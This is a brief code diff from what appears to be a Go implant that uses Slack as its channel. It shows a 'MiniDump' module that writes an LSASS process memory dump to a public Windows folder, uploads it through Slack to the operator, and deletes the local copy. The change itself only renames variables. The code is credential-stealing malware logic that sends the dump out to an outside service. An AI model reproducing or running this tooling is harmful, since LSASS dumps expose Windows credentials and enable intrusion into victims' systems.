@@ -72,7 +72,7 @@ func (m MiniDump) Run(clientID string, jobID string, args []string) (string, err
 	// TODO: Work out how to do this in memory
 
 	//f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
-	f, tempErr := os.Create("C:\\Users\\Public\\" + ClientID + ".dmp")
+	f, tempErr := os.Create("C:\\Users\\Public\\" + clientID + ".dmp")
 	if tempErr != nil {
 		return "", tempErr
 	}
@@ -102,11 +102,11 @@ func (m MiniDump) Run(clientID string, jobID string, args []string) (string, err
 	// idk why this fixes the 'not same as on disk' issue, but it does
 	f.Close()
 	// Upload lsass.exe dump
-	err = slack.Upload(ClientID, JobID, "C:\\Users\\Public\\"+ClientID+".dmp")
+	err = slack.Upload(clientID, jobID, "C:\\Users\\Public\\"+clientID+".dmp")
 	if err != nil {
 		return "", err
 	}
-	deleteFile("C:\\Users\\Public\\" + ClientID + ".dmp")
+	deleteFile("C:\\Users\\Public\\" + clientID + ".dmp")
 	if r != 0 {
 		ret.FileContent, err = ioutil.ReadFile(f.Name())
 		if err != nil {
